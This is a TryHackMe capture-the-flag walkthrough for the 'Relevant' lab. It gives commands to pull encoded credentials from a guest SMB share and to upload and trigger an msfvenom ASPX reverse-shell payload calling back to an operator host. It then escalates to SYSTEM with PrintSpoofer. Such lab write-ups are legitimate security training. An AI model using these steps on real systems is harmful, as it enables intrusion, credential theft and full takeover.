Relevant

TryHackMe · Medium by Brenno M.

Relevant chains a writable SMB share that is also served by IIS (letting us upload an ASPX web shell) and a SYSTEM escalation abusing the SeImpersonate privilege with PrintSpoofer.

Reconnaissance

Nmap reveals IIS (80 and a high port, 49663), SMB and RDP. The nt4wrksv share is accessible as guest and contains base64-encoded credentials (passwords.txt).

nmap -p- -T4 -sV -sC <IP>
smbclient //<IP>/nt4wrksv -N
get passwords.txt   # base64 -> credentials

Foothold - SMB + IIS

The nt4wrksv share is the same directory served by IIS on port 49663. Upload an ASPX web shell (msfvenom) via SMB and browse to the URL to get a shell as the IIS app pool.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY_IP> LPORT=4444 -f aspx -o shell.aspx
smbclient //<IP>/nt4wrksv -N -c 'put shell.aspx'
curl http://<IP>:49663/nt4wrksv/shell.aspx

Escalation - PrintSpoofer

whoami /priv shows SeImpersonatePrivilege enabled. PrintSpoofer abuses this privilege to run a command as SYSTEM.

whoami /priv
PrintSpoofer64.exe -i -c cmd
# SYSTEM -> read user.txt and root.txt
